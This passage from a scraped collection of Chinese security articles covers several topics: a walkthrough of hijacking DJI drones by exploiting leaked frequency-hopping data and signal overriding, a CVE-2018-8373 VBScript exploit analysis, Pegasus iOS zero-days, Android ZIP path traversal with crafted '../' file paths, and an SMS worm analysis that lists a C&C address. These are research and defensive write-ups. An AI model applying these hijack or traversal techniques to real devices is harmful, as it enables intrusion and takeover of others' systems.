在理解了GFSK制式的原理后，接下来我们尝试在HackRF的上写出GFSK解调脚本，从一段遥控实际发出的电磁波中提取二进制数据（如下图13）。需要注意的是HackRF收发的射频数据另外采用了IQ调制解调，代码上也需要简单处理一下。图13 在空中传播的GFSK电磁波（IQ制式）由于没有找到现成的解调代码，只好在MATLAB上（如下图14）摸爬滚打了许久，并恶补了许多通信基础知识，折腾出（如下图15）GFSK解调脚本，并成功模拟遥控器的跳频逻辑，能够像无人机那样获取每一次跳频的数据。至此， 我们再次得到了作为安全人员来说最喜欢的二进制数据流。图14 MATLAB中模拟GFSK解调图15 GFSK解调脚本工作图0x020202 遥控控制数据总结 经过分析，一条典型的遥控控制数据如下（图16）所示（最新版本固件和稍旧版本的固件协议，格式略有不同）：图16 两种类型的遥控控制数据最开始的5个字节为发送方的ShockBurst地址，用于给无人机验证是不是配对的遥控器。接下来的26字节为遥控数据本身（上下，左右，油门，刹车等遥控器上的一切操作），我们详细来讲解下。遥控器上的控制杆的一个方向（如上+下，左+右）由12bit来表示。如表示左右方向及力度的数值power_lr由上数据的第5个字节和第6个字节的低4位决定，控制杆居中时power_lr为0x400（1024），控制杆拉至最左时power_lr为0x16C（364），而拉至最右时power_lr为0x694（1684）。也就是说，遥控器可以将控制杆左和右，力度可分为660级，并在控制数据中占用12bit传输给无人机主机，主机针对不同的力度执行不同的飞行行为。图17 遥控控制数据解析代码片段其他遥控控制杆的数据也非常类似，故不再赘述。值得注意的是，所有26字节的遥控控制数据是一次性的发给无人机的，故上下，左右，前进后退，油门刹车等所有行为都是并行无干扰的。这也是无人机遥控性能指标中经常说的支持6路信号，12路信号的含义。控制数据中最后的1个字节位CRC8校验位（旧版是CRC16），是前面的31字节的CRC8/CRC16校验结果，校验错误的数据将被抛弃。0x0203 遥控器和无人机通讯逻辑总结 通过以上漫长的分析过程，我们总算完全搞懂了在遥控器上拨动控制杆的行为，是如何一步步反馈到无人机的飞控程序来完成对应的飞行行为。简单整理下：a) 遥控器和无人机开机后，遥控器负责发送数据，无人机负责接收数据。它们通过共同的跳频序列的高速跳频来保持一个数据链路，链路故障有一定能力能迅速恢复。b) 无人机每7ms就会收到一次遥控器发出的32字节控制数据，控制数据只有一条命令一种格式，所有控制杆和开关的状态会一次性发送到无人机。无人机收到数据后会进行地址校验和CRC校验，确保数据是正确无误的。c) 用户在操纵遥控器的过程中，操控的行为和力度都会在7ms内通过那32字节控制数据反馈至无人机，接着由无人机的飞控程序来完成对应的飞行行为。0x03 各个击破：完全控制无人机 从遥控器的通讯逻辑来看，想要通过HackRF这类SDR设备覆盖遥控器发出的射频数据来劫持无人机。必须解决以下几个问题：a) 虽然通过HackRF来收发GFSK数据已经没有问题，但不知道跳频序列根本无法和无人机保持同步。b) 如何打断遥控器原本和无人机之间的稳定射频链路，并同时建立和无人机之间新的稳定链路。c) 大疆遥控器的射频功率做了大量优化，有效控制距离达一公里，HackRF的射频频率难以企及。下面我们来看看如何逐个击破这几个问题。0x0300 伪造遥控器：信道的信息泄漏漏洞 在通过脚本对遥控器信号进行GFSK解调时，我们发现了BK5811芯片一个奇怪的现象：芯片在某个频道发送数据时，会同时向临近的特定频道发送同样内容数据内容。举个例子来说，同在+7ms这一时刻，除了会向13号频道发送属于这个频道的数据外，还会向其他一些特定的频道发送原本属于13号频道的数据。+ 7ms: Channel 13,+ 7ms: Channel 09,+ 7ms: Channel 21,这个奇怪的现象虽然不会影响射频的功能，只是多了一些冗余数据，但却成了我们得到遥控器跳频序列的突破点，实实在在的构成了一个信息泄露漏洞。我们可以通过脚本，从5725MHz到5850MHz进行遍历，每次隔1MHz，刚好覆盖BK5811的每一个频道。遍历监听时，考虑单个频点的情况，我们能得到冗余数据（假设监听61号频道）如下：+ 0ms: Channel 61,+ 7ms: Channel 13,+ 21ms: Channel 09,+ 112ms: Channel 61,因为我们已经明确112ms是一次跳频序列的循环，那么从冗余数据中我们可以推论：ch61 + 1 Step(7ms) = ch13ch13 + 3 Step(21ms) = ch09ch09 + 12 Step(84ms) = ch61换成文字结论即是：如果61号频道是跳频序列的第1个，那么13号频道是第2个，9号频道是第4个，一个一个频道的去遍历，就可以把这个序列补充完整。实际遍历时我们发现，HackRF脚本仅需要30到120秒，不需要遍历全部127个频道，即可推论和补齐完整的16个频点及跳频序列（如下图所示）。图18 HackRF脚本遍历后得到完整的跳频序列通过这个特殊的信息泄露漏洞，配合遥控器的调频规律可快速得到跳频序列，但我们也不清楚为什么BK5811芯片会存在这样的信息泄露漏洞。随后我们拿nRF24L01+也做了类似的测试，发现nRF24L01+也同样会产生同样的问题。0x0301 劫持无人机：信号覆盖漏洞     下面来看看信号覆盖的问题如何解决。有个关键的前提是遥控器只发数据，无人机只收数据，它们之间没有交互。在之前进行逻辑分析的时候我们发现，不管无人机是1ms跳频一次还是7ms跳频一次，它实际上只会接收跳频完毕后最早发给它的合法数据包。正常情况下可能是跳频完毕后的第5ms时，收到了遥控器发过来的数据，再下一次跳频后的5ms时，再收到遥控器发过来的下一次数据。那如果我们能一直早于遥控器发出数据，无人机岂不是就直接使用我们的数据了？确实是这样的。假设我们的控制脚本中设置为6ms跳频，我们很快能夺取无人机的控制权（7次跳频内）。但遥控器也会夺回控制权，最终就会出现无人机有1/7的数据来自遥控，6/7的来自黑客的局面。这其实是一场信号争夺战，那么有没有办法让无人机更稳定的更稳定接收我们的信号呢？如果我们把跳频时间设置为 6.9ms，跳频后每隔0.4ms（Arduino UNO R3的速度极限）发送一次遥控控制数据的话，虽然夺取无人机控制权需要更长的时间（约10s），但一旦获得控制权，在0.4ms发送一次数据的高刷新率覆盖之下，遥控器基本没可能夺回控制权。图19 伪造遥控器的SPI命令数字逻辑至此，劫持无人机的基本技术问题已经通过一个信息泄漏漏洞和一个信号覆盖漏洞解决了。0x0302 稳定性 &amp; 可用性优化     在实现控制脚本的过程中，HackRF存在的两个严重限制：一方面HackRF使用USB通讯接口决定了它的通讯延迟巨大（指令延迟约为30ms），上文中动辄0.4ms的控制精度HackRF做不到；另外一方面，HackRF在5.8GHz频段的信号衰减严重（信号强度仅为遥控器的1%，可能是通用天线在高频段增益偏低），估计只有在贴着无人机射频芯片的情况下才有作用。天线问题故无法使用HackRF劫持无人机。灵机一动，我们想到了和遥控器类似的做法：通过Arduino UNO R3单片机平台来操作BK5811芯片，直接在Arduino上实现我们的控制逻辑。当然，再加一个某宝上淘的有源信号放大器，如下图所示。根据测试，有效控制范围为10米左右。图20 无人机劫持模块全家福最终，通过了漫长的分析和各种漏洞利用方法的尝试后，我们完成了对大疆无人机的劫持。通过HackRF遍历和监听，然后将序列输入到Arduino中，在Arduino中完成对无人机信号的劫持，最后来通过Arduino上连接的简易开关来控制无人机。控制效果可以参看这个央视315中的视频片段。0x04 后记：攻是单点突破，防是系统工程 从漏洞分析和利用的过程来看，大疆在设计无人机和射频协议时确实考虑了安全性的问题，其中跳频机制虽然很大程度上提升了协议的破解难度，但却被过度的依赖。笔者和团队长期从事腾讯产品的漏洞研究工作，深知如所有其他漏洞攻防场景一样，分散而孤立的防御机制跟本无法抵御黑客的突破或绕过，指望一个完美的系统来抵御黑客，如同指望马奇诺防线来抵御德国军队的入侵一样不现实。而更现实情况是攻和守的不对称，攻击者利用单点的突破，逐层的推进，往往会领先防御者一大截。防御者就无计可施了吗？当然不是。聪明的防御者一定懂得两个系统性的思路：未知攻焉知防和借力。一方面防守者必须是优秀的攻击者，才有可能嗅得到真正攻击者的蛛丝马迹，才有可能在关键节点上部署符合实际情况；另外一方面防守者必须借助自己是在企业内部这一优势和业务并肩作战，利用业务的资源和数据这些攻击者拿不到的资源，配合对攻击的理解，建立对攻击者来说不对称的防御系统。另外一个层面，智能硬件行业各个厂商对安全的重视令人堪忧。作为无人机行业绝对第一的大疆，尚且存在严重的安全问题，更不要说其他公司——笔者和TSRC物联网安全研究团队近两年业余时间对智能硬件安全的研究也印证了这个结论。二进制漏洞的复杂性和门槛决定了这种漏洞类型很少有机会出现在公众的视野中，但在更隐晦的地下，二进制漏洞攻击者的力量正在以防御者无法企及的速度悄然成长。也许等到阿西莫夫笔下《机械公敌》中的机器人社会形态形成时，我们要面对的不是人工智能的进化和变异，而是漏洞攻击者这种新时代的恐怖分子。最后，感谢我有一把刷子、zhuliang、泉哥、lake2在整个破解过程中的支持。0x05 相关链接 [1]http://v.qq.com/iframe/player.html?vid=m0019do4elt&amp;width=670&amp;height=502.5&amp;auto=0[2] http://2015.geekpwn.org/[3] http://www.dji.com/cn/newsroom/news/dji-statement-15mar[4] http://www.bekencorp.com/Botong.Asp?Parent_id=2&amp;Class_id=8&amp;Id=14[5] https://github.com/mossmann/hackrf[6] https://www.arduino.cc/en/Main/ArduinoBoardUno[7] https://github.com/JiaoXianjun/BTLE[8] http://blog.kismetwireless.net/2013/08/playing-with-hackrf-keyfobs.html【原文：315晚会报道的无人机是怎么被劫持的？ 作者：Gmxp   安全脉搏Blackhold编辑整理发布】","2016-03-26 13:02:23","无线安全","315晚会报道的无人机是怎么被劫持的？","https://www.secpulse.com/archives/44372.html"
"5cca9923e0c518ef8fd59747","一、漏洞简介VBScript引擎处理内存中对象的方式中存在一个远程执行代码漏洞。该漏洞可能以一种攻击者可以在当前用户的上下文中执行任意代码的方式来破坏内存。成功利用此漏洞的攻击者可以获得与当前用户相同…","四维创智","一、漏洞简介VBScript引擎处理内存中对象的方式中存在一个远程执行代码漏洞。该漏洞可能以一种攻击者可以在当前用户的上下文中执行任意代码的方式来破坏内存。成功利用此漏洞的攻击者可以获得与当前用户相同的用户权限。如果当前用户使用管理用户权限登录，则成功利用此漏洞的攻击者可以控制受影响的系统。然后攻击者可以安装程序; 查看，更改或删除数据; 或创建具有完全用户权限的新帐户。 在基于Web的攻击情形中，攻击者能通过Internet Explorer利用此漏洞的特定网站，然后诱使用户查看该网站。攻击者还可以在承载IE呈现引擎的应用程序或Microsoft Office文档中嵌入标记为“安全初始化”的ActiveX控件。攻击者还可以利用受到破坏的网站和接受或托管用户提供的内容或广告的网站。这些网站可能包含可能利用此漏洞的特制内容。 2018年8月14日，微软发布了安全补丁，影响流行的大部分系统版本。漏洞基本信息漏洞IDCVE-2018-8373漏洞名称Microsoft VBScript引擎远程执行代码漏洞漏洞类型远程代码执行威胁类型UAF影响系统版本IE9 WS 2008 32/64、IE10 Windows Server2012、IE11大部分版本 二、漏洞测试系统环境Win7 32/64IE版本IE10EXPhttps://github.com/B1eed/VulRec/blob/master/CVE-2018-8373 三、漏洞原理由于样本混淆严重，部分代码见图1，这里采用简化POC进行分析，代码见图2。图1 样本采用了严重混淆 图2 Crash Poc Crash PoC定义了MyClass类、一个array的成员变量和两个成员函数：Class_Initialize  与Default Property Get P。Class_Initialize 是一种被弃用的方法，现在已经被新的过程所替代。当对象初始化的时候，会被自动唤醒。在PoC中，Class_Initialize 是重载的，当调用 VBScriptClass::InitializeClass时，处理的是重载的函数。 MyClass：通过new进行创建并赋值给指定变量cls，该操作首先会触发类的创建以及初始化，创建类的函数由vbscript!VBScriptClass::Create函数完成；创建类成功后则会调用vbscript!VBScriptClass::InitializeClass函数对class的内容进行初始化；在vbscript!VAR::IsFunction函数中获取class指针； 随后调用class的虚函数vbscript!CScriptEntryPoint::Call 进行初始化,最终的调用栈如下： vbscript!CScriptRunTime::RunNoEH负责对编译后的vbs代码进行解释执行。这里执行类的初始化操作，主要包含了array数组的定义以及Class_Initialize函数的执行。vbscript中创建数组的函数为vbscript!MakeArray，如下：  ReDim array(2)：会调用vbscript!MakeArray来创建元素数是3的数组，如下图  cls.array(2)：调用vbscript!Accessarray来获取数组元素的地址。在vbscript!Accessarray 中，首先会检查数组元素的索引是否越界，然后计算元素的地址，保存到栈中。 将元素的地址保存到堆栈上，保存array(2)= 0x12ae6ff0地址到栈上cls.array(2)=cls：调用vbscript!AssignVar来设置MyClass的默认属性值为 cls.array(2)。获取MyClass的默认属性值后，会调用Public Default Property Get P并执行Public Default Property Get P中的ReDim array(1)，释放了原来的pvData。  ReDim Preserve array(1)：重置array内存的操作实际通过函数RedimPreserveArray实现，最终会调用SafeArrayRedim可以看到array对象的pvData已经被修改为0x0818afe0，之前的pvData(0x12ae6fd0)的内存地址已经被释放，包括之前保存在栈上的0x12ae6ff0。 array(2)的地址仍然保存在栈中， Public Default Property Get P 的返回值会访问释放的内存，最终导致UAF漏洞。 四、EXP调试分析调试方法同Crash PoC，跟踪分析如何将二维数组修改长度为0x0FFFFFFF，如何实现任意内存读写以及如何伪造CONTEXT结构来执行Shellcode。漏洞定义了两个数组，array1和array2。array1就是前面PoC中描述的数组，array2是一个二维数组，其中每个元素的值都是3。然后使用脚本回调函数DefaultPropertyGet释放原来的array1.pvData，设置array2为新的array1.pvData。因为原来array1.pvData的大小和array2.SAFEARRAY结构是相同的，在内存中是0x30字节。array2.SAFEARRAY结构将重用原始array1.pvData中释放的内存。同时，DefaultPropertyGet的返回值0x0FFFFFFFF会覆盖array2.SAFEARRAY的结构SAFEARRAYBOUND，并修改二维数组的长度为0x0FFFFFFF。 修改二维数组的长度为0x0FFFFFFF将array(index_vul)(index_a, 0)设置为“AAAA”，使下个array2的Data域就变成了8，因为string的VarType类型为8，这样就得到了一组可以混淆的 array(index_vul)(index_a+n, 0)和array(index_b)(0, n)，通过将array(index_vul)(index_a, 0)处的variant 转化为长整型，令array(index_vul)(index_a, 0)处的variant转化为数组，从而得到了一段泄露的内存util_mem，即可读写内存指定区域。执行rw_primit后，指定位置已被覆盖成0x200C，有了一块泄露的内存 util_mem，能够实现 32 位下用户态任意地址读写的一维数组 执行Shellcode方法与8174相同，这里不再详细分析。在Windows7环境下能够成功利用，以弹出calc为例。 参考：https://blog.trendmicro.com/trendlabs-security-intelligence/use-after-free-uaf-vulnerability-cve-2018-8373-in-vbscript-engine-affects-internet-explorer-to-run-shellcode/原创文章转载请注明作者：四维创智","2018-11-27 10:20:38","代码审计","Windows VBScript引擎远程执行代码漏洞 之CVE-2018-8373分析与复现","https://www.secpulse.com/archives/82615.html"
"5cca9923e0c518ef8fd59748","iOS 9.3.5今天紧急上线，苹果更新日志中有提到修复了“重要安全问题”。如果你还没有更新的话，那么请尽快更新，因为这次涉及的iOS安全问题可能是“前所未有”的。苹果所指的重要安全问题乃是说3个0-…","SP胖编","iOS 9.3.5今天紧急上线，苹果更新日志中有提到修复了“重要安全问题”。如果你还没有更新的话，那么请尽快更新，因为这次涉及的iOS安全问题可能是“前所未有”的。苹果所指的重要安全问题乃是说3个0-day漏洞，这3个漏洞足以让攻击者对全球范围内的iPhone进行监听。Lookout在报告中是这么说的，利用这些漏洞，攻击者可对设备进行全面控制，还能获取设备中的数据，通过麦克风监听对话，检测GPS信号位置，跟踪即时通讯应用的对话内容等等。这“是我们在终端设备上见过最复杂精致的攻击”。监听活动或已长达数年这次在苹果发布iOS 9.3.5之后，紧随其后发布报告的是Citizen Lab实验室和Lookout。这两家公司在报告中提到，此次发现的3个0-day漏洞是攻击者用于在全球范围内监听“政治异议人士”的。这3个漏洞分别是：CVE-2016-4658——Webkit的Memory Corruption：Safari Webkit引擎漏洞，用户点击恶意链接后，就能对设备产生危害；CVE-2016-4655——内核信息泄露：kernel base mapping漏洞，泄露的信息可致攻击者算出内存中的内核位置；CVE-2016-4657——Kernel Memory corruption导致越狱：32位/64为iOS内核级别漏洞，可致攻击者悄悄对设备进行越狱，并安装窃听软件。利用这3个漏洞的是款软件套装，名为Pegasus（希腊神话中带翅膀的飞马）。据说这款软件是由以色列的NSO Group集团开发的，而且卖给全球范围内的政府客户——政府用来做什么，自然就很清楚了。Pegasus的开发目标就是为执法机构服务，是款不折不扣的情报软件，和相较黑市中出售的那些间谍软件相似，只不过可能在复杂程度上更甚。钓鱼短信中的恶意链接据说可致“一键越狱”整个攻击过程首先是通过短信、引诱受害者访问某恶意站点，感染用户级别权限的恶意程序，随后可提权获取内核级别权限，一旦恶意程序攻入iOS内核（执行安全检查和均衡，管理各应用保持独立），就真的悲剧了。对这次漏洞的利用而言，只需要点击一个网址，就能达到越狱的效果，真正做到了“一键越狱”。漏洞利用过程Pegasus就能利用0-day漏洞致远程攻击者拿下iOS设备。有了Pegasus就能对iOS用户进行窃听，而且是在用户几乎不会察觉的情况下——如上所述，针对iPhone和iPad，攻击者可以对设备进行完全控制，释放数据、开启麦克风窃听对话、检测用户的地理位置、追踪IM聊天内容等等。Pegasus可访问和释放的数据包括，短信、邮件、通话记录，还有包括Gmail、Facebook、Line、Mail.Ru、日历、微信、Tango、WhatsApp、Viber、Skype等在内的即时通讯应用数据。Pegasus影响的iOS版本，从最近的iOS 9.3.4一直到较早的iOS 7，这表明Pegasus可能已经在人类毫不知情的情况下，持续监听了iOS用户好几年时间，直到最近才被发现。恶意软件主要卖给政府从国外媒体的报道来看，最早察觉到Pegasus的，是来自阿联酋的一名人权运动积极分子，名为Ahmed Mansoor。据说Mansoor先前就曾经受过FinFinsher和RCS间谍软件的“指点”——这两款间谍软件也相当知名，分别来自Gamma Group和HackingTeam，这两个组织本身就是NSO的强有力竞争对手。所以Mansoor在收到钓鱼短信之后，也就很快意识到其中的链接存在问题。所以他将这条短信转发给了Citizen Lab——这个实验室是专门从事包含政治背景网络间谍活动的跨学科研究的，位于加拿大多伦多大学的蒙克全球事务学院（Munk School of Global Affairs）。随后Citizen Lab拉来了Lookout一同调查，Lookout于是就发现了这3个0-day漏洞，Citizen Lab则调查到了此事的政治背景，发现了幕后的NSO Group。这家以色列公司早在2014年已经被美国公司Francisco Partners收购。Citizen Lab对Pegasus软件进行了追踪，发现针对多个政府的export license证书。具体说，调查中最直接的发现是，这款软件针对墨西哥的一名新闻工作者——他曾经揭露墨西哥总统的腐败行径；另外还有针对肯尼亚的一些未知目标。“虽然这些监听工具都是在民主国家开发的，但它们持续出售给一些在人权问题方面臭名昭著的国家。”所以对iPhone和iPad用户而言，还是赶紧升级最新版的iOS 9.3.5吧，未知最新iOS 10预览版是否也存在这些漏洞。后续还将针对此次事件进行更为详细的报道。 【报道来源：FreeBuf，作者/欧阳洋葱，安全脉搏整理发布】","2016-08-26 21:06:00","移动安全","iOS曝严重安全漏洞：iPhone用户或已被监听数年","https://www.secpulse.com/archives/51469.html"
"5cca9924e0c518ef8fd59749","1、ZIP文件目录遍历简介 ZIP压缩包文件中允许存在“../”的字符串，攻击者可通过精心构造ZIP文件，利用多个“../”从而改变ZIP包中某个文件的存放位置，覆盖替换掉应用原有的文件。 如果被覆盖…","SP小编","1、ZIP文件目录遍历简介ZIP压缩包文件中允许存在“../”的字符串，攻击者可通过精心构造ZIP文件，利用多个“../”从而改变ZIP包中某个文件的存放位置，覆盖替换掉应用原有的文件。如果被覆盖掉的文件是是可.so文件、dex文件或者odex文件，轻则产生本地拒绝服务漏洞，影响应用的可用性，重则可能造成任意代码执行漏洞，危害应用用户的设备安全和信息安全。比如“寄生兽”漏洞，海豚浏览器远程命令执行漏洞，三星默认输入法远程代码执行等。阿里聚安全的应用漏洞扫描器，可以检测出应用的ZIP文件目录遍历风险，并有完整的修复方案。另外我们还发现日本计算机应急响应小组（JPCERT）给出的修复方案存在缺陷，容易使用不当（它提供的示例文档就使用错误），可能起不到防止ZIP文件目录遍历的作用。2、漏洞原理和风险示例2.1 漏洞原理在Linux/Unix系统中“../”代表的是向上级目录跳转，有些程序在当前工作目录中处理到诸如用“../../../../../../../../../../../etc/hosts”表示的文件，会跳转出当前工作目录，跳转到到其他目录中。Java代码在解压ZIP文件时，会使用到ZipEntry类的getName()方法，如果ZIP文件中包含“../”的字符串，该方法返回值里面原样返回，如果没有过滤掉getName()返回值中的“../”字符串，继续解压缩操作，就会在其他目录中创建解压的文件。如我们构造的ZIP文件中有如下文件：进行解压的代码如下，没有对getName进行过滤：解压操作时的日志：此ZIP文件存放在SD卡中，想让解压出来的所有文件也存在SD卡中，但是a_poc.txt文件却存在了应用的数据目录中：2.2 风险示例参考乌云Drops上的文章：http://drops.wooyun.org/mobile/8293，以海豚浏览器远程代码执行漏洞为例。海豚浏览器海豚浏览器的主题设置中允许用户通过网络下载新的主题进行更换，主题文件其实是一个ZIP压缩文件。通过中间人攻击的方法，替换掉这个ZIP文件。用来替换ZIP文件的恶意ZIP文件中，有重新编译的libdolphin.so，此so文件，重写了JNI_OnLoad()函数：此so文件以“../../../../../../../../../../data/data/mobi.mgeek.TunnyBrowser/files/libdolphin.so”的形式存在恶意ZIP文件中。海豚浏览器解压恶意ZIP文件后，重新的libdolphin.so就会覆盖掉原有的so文件，重新运行海豚浏览器会弹出Toast提示框：能弹出Toast说明也就可以执行其他代码。这里分析下此漏洞产生的原因是： 1、主题文件其实是一个ZIP压缩包，从服务器下载后进行解压，但是解压时没有过滤getName()返回的字符串中是否有“../”：2、动态链接库文件libdolphin.so，并没有放在应用数据的lib目录下，而是放在了files目录中：加载使用的地方是com.dolphin.browser.search.redirect包中的SearchRedirector：应用使用的是System.load()来加载libdolphin.so而非System.loadLibrary()，在Android中，System.loadLibrary()是从应用的lib目录中加载.so文件，而System.load()是用某个.so文件的绝对路径加载，这个.so文件可以不在应用的lib目录中，可以在SD卡中，或者在应用的files目录中，只要应用有读的权限目录中即可。在files目录中，应用具有写入权限，通过网络中间人攻击，同时利用ZIP文件目录遍历漏洞，替换掉文件libdolphin.so，达到远程命令执行的目的。应用的lib目录是软链接到了/data/app-lib/应用目录，如果libdolphin.so文件在lib目录下就不会被覆盖了，第三方应用在执行时没有写入/data/app-lib目录的权限：3、JPCERT修复方案的研究JPCERT提供的修复方案在文档：https://www.jpcert.or.jp/present/2014/20140910android-sc.pdf。其检查方式是利用File类提供的getCanonicalPath()方法滤掉zipEntry.getName()返回的字符串中所包含的“../”，然后检查这个字符串是否是以要解压到的目标目录字符串为开头，如果是返回getCanonicalPath()获取到的字符串，如果不是，则抛出异常：但是在JPCERT给出的示例代码中，对validateFilename()的调用对于APP来说不会达到防止任意目录遍历的目的：其使用“.”，作为要解压到的目的目录，“.”表示当前目录，经测试APP进程的当前工作目录是根目录“/”：查看进程状态，得到的APP进程的当前工作目录cwd是链接到了根目录：如下的Demo，如果采用JPCERT示例中validateFilename(entry.genName(), “.”)的调用方式，还是会产生目录遍历读到系统配置文件：读到的hosts文件内容：正确的调用validateFilename()形式是传入的要解压到的目的目录不要用“.”，而是指定一个绝对路径。4、阿里聚安全对开发者建议1 网络传输尽量使用HTTPS，并正确使用HTTPS。2 对重要的ZIP进行数字签名校验，校验通过才进行解压。3 检查Zip压缩包中使用ZipEntry.getName()获取的文件名中是否包含”../”或者”..”，检查”../”的时候不必进行URI Decode（以防通过URI编码”..%2F”来进行绕过），测试发现ZipEntry.getName()对于Zip包中有“..%2F”的文件路径不会进行处理。阿里聚安全扫描器建议修复方案： 在使用java.util.zip包中ZipInputStream类的进行解压操作时，进行检查，示例如下：也可以使用java.util.zip包中的ZipFile类，直接读取Zip包中的所有entries，然后检查getName()的返回值是否包含“../”：5、参考[1] https://www.jpcert.or.jp/present/2014/20140910android-sc.pdf[2] 《海豚浏览器与水星浏览器远程代码执行漏洞详解》http://drops.wooyun.org/mobile/8293[3] 《影响数千万APP的安卓APP“寄生兽”漏洞技术分析》http://drops.wooyun.org/mobile/6910[4] 《三星默认输入法远程代码执行》http://drops.wooyun.org/papers/6632[5] http://www.oracle.com/technetwork/articles/java/compress-1565076.html[6] http://stackoverflow.com/questions/1099300/whats-the-difference-between-getpath-getabsolutepath-and-getcanonicalpath[7] http://stackoverflow.com/questions/7016391/difference-between-system-load-and-system-loadlibrary-in-java 【原文：Android安全开发之ZIP文件目录遍历   作者：伊樵、呆狐、舟海@阿里聚安全    安全脉搏整理发布】","2016-06-26 17:24:22","移动安全","Android安全开发之ZIP文件目录遍历","https://www.secpulse.com/archives/48052.html"
"5cca9924e0c518ef8fd5974a","我是这个世界的一个和平主义者，我首先收到信息是你们文明的幸运，警告你们：不要回答！不要回答！不要回答！！！” ———《三体》 《三体》是国内科幻小说界里程碑式的作品，多位互联网大佬都是其粉丝，去年其更…","安天移动安全","我是这个世界的一个和平主义者，我首先收到信息是你们文明的幸运，警告你们：不要回答！不要回答！不要回答！！！” ———《三体》《三体》是国内科幻小说界里程碑式的作品，多位互联网大佬都是其粉丝，去年其更是荣获科幻小说界的最高奖 “雨果奖”。小说中人类为探索外星文明向宇宙发送电波并收到了三体文明的回复，一旦人类回复该电波，三体将立即定位地球位置并开展后续的侵略行动。不止在小说中，现实生活中也存在很多类似的“钓鱼”短信在人们之间传播，一旦不慎点开了短信中的“钓鱼”链接，链接中附带的病毒将立即入侵手机，给人们的隐私、财产安全带来极大的威胁。在此，安天*L移动安全和猎豹移动安全实验室提醒大家：在收到附带“钓鱼”链接的短信时，不要点开！不要点开！不要点开！！！近期，安天*L移动安全和猎豹移动安全实验室就监控到一个群发“钓鱼”短信散布蠕虫病毒的恶意事件，事件中的Curiosity病毒一旦进入手机将立即获取感染手机的联系人信息并群发“钓鱼”短信，短信的内容为“你好，我看到这有你的私密照片，点击链接查看：hxxp://b**.ly/2abgToi”。收件人一旦没忍住好奇心点击了该链接，链接指向的蠕虫病毒将会被下载到用户手机。该病毒利用大家对朋友的信任和好奇心，通过短信进行蠕虫病毒传播，并通过远程控制功能形成僵尸网络。值得注意的是，该病毒的远程控制功能是借助Google的C2DM(Android Cloud to Device Messaging)服务实现。接下来，我们将对该病毒进行详细的行为解析。Curiosity病毒运行流程图详细分析群发“钓鱼”短信并拦截短信Curiosity病毒在运行时会获取用户手机中所有联系人的号码，然后向这些号码发送包含蠕虫病毒下载链接的“钓鱼”短信，以诱导更多的用户去下载。短信的内容有多种语言版本，如下图所示，包含英语、阿拉伯语、西班牙语、葡萄牙语、法语等。我们选取其中一个短信内容翻译成中文为：“你好，我看到这有你的私密照片，点击链接查看hxxp://b**.ly/2abgToi ”。收件人一旦点开短信中的链接，链接指向的蠕虫病毒将下载到用户的手机中。蠕虫病毒伪装程序名为picture，以诱导用户下载安装。同时该病毒会将自身设置为默认的短信应用，完全拦截用户接收到的短信，导致用户无法接收到短信，并将黑名单中号码的短信进行删除。设置自身为默认短信应用：拦截用户接收到的短信：删除黑名单中号码的短信：利用Google推送服务远程控制Curiosity病毒在运行时通过Google的C2DM（Android Cloud to Device Messaging）推送服务向感染手机推送远程控制指令，控制感染手机向指定号码拨打电话、向指令号码发送攻击者自定义的短信、向用户联系人群发自定义短信等恶意行为。C2DM框架是Google官方提供的数据推送工具,允许第三方开发者通过C2DM服务器向用户手机推送少量的数据。在这里要对Google的C2DM推送流程进行简单的介绍：使用C2DM来进行Push操作，需要一部包含Google服务的安卓手机、C2DM服务器和第三方服务器。如上图所示Curiosity病毒利用C2DM服务进行数据推送的流程：Step1.使用感染用户的Google账号在C2DM服务器注册一个registration ID。Step2.将Google账号和C2DM服务器返回的registration ID发送到攻击者的服务器。Step3.攻击者的服务器将registration ID和要推送的数据以post的方式发送给C2DM服务器上。Step4.C2DM服务器将推送的数据以push的形式推送到该手机上。窃取用户隐私信息Curiosity病毒运行时会窃取大量的用户隐私信息和设备信息并上传到远程服务器，窃取的隐私信息内容如下（日历和浏览器信息在此版本中暂未实现）：上传用户隐私信息：此外，该病毒还通过Watchdog对短信、联系人和通话记录进行监控，一旦这些内容发生变化就会将相关信息上传到远程服务器。在上传时该病毒会使用感染用户的Google账号和设备IMEI作为账号密码进行登录，然后进行上传操作。 　　进行登录操作返回Token：上传通话记录：上传联系人：上传短信：攻击电话功能Curiosity病毒会在用户拨打电话时自动跳转到Home界面并静默挂断，也会静默挂断指定的号码来电，导致手机电话功能几乎崩溃。拨打电话时跳转到手机的Home界面：静默挂断电话：总结Curiosity病毒运行后获取感染手机的联系人信息，并向联系人群发容易引起好奇心的短信内容,以诱导收件人点击短信中的恶意下载链接，进行蠕虫病毒传播并进一步形成“僵尸网络”，手段极其狡猾。同时该病毒会基于用户自身的Google账户注册C2DM推送模块，通过该模块将远程控制指令推送到用户手机中，后续基于远程指令进行的更深层次的恶意行为。利用第三方平台进行指令推送，手段隐蔽且成本较低，是远程控制病毒的发展趋势。值得注意的是，该病毒并没有包含恶意扣费、推送广告等常见的可获利恶意行为，只有上传用户隐私信息和导致电话功能瘫痪等影响用户正常使用手机的恶意行为。联想到最近国内发生的多起电信诈骗的事件，事件中的受害者被不法者利用隐私信息骗取信任，后续进行诈骗行为。该病毒的恶意开发者后续也有利用窃取的隐私信息对感染用户进行精准电信诈骗的潜在可能，使得感染用户的财产面临极大的安全隐患。安全建议针对Curiosity系列病毒，*L反病毒引擎集成合作方产品和猎豹专杀工具已经实现全面查杀。安天*L移动安全团队和猎豹移动安全实验室提醒您：1.谨防电信诈骗，不要随意点击任何未知来源或奇怪短信中的链接。2.请保持良好的上网习惯，不要在非官方网站或者不知名应用市场下载任何应用。3.强烈建议您使用安全软件，并保持定期扫描的良好习惯。安天*L移动安全团队专注于移动互联网安全技术研究及反病毒引擎研发，为合作伙伴提供强大的移动安全解决方案。*L移动反病毒引擎致力于为企业和厂商伙伴提供针对性的移动终端威胁防护解决方案，如病毒检测、金融安全防护、上网安全防护等安全能力输出。目前已与众多知名厂商达成战略合作，为猎豹、小米MIUI、阿里云YunOS、OPPO、努比亚、步步高、LBE、安卓清理大师、AMC等合作伙伴提供移动反恶意代码能力，为全球过亿终端用户保驾护航。附录C&amp;C信息：185.38.248.94Curiosity病毒样本MD5：E13DFF259B80B70ABAAC5C9BCE129637 【本文由安天*L移动安全团队原创投稿安全脉搏，转载请注明来源安全脉搏】","2016-10-13 12:16:14","移动安全","黑产上演《三体》剧情：蠕虫病毒入侵手机群发“钓鱼”短信","https://www.secpulse.com/archives/52421.html"
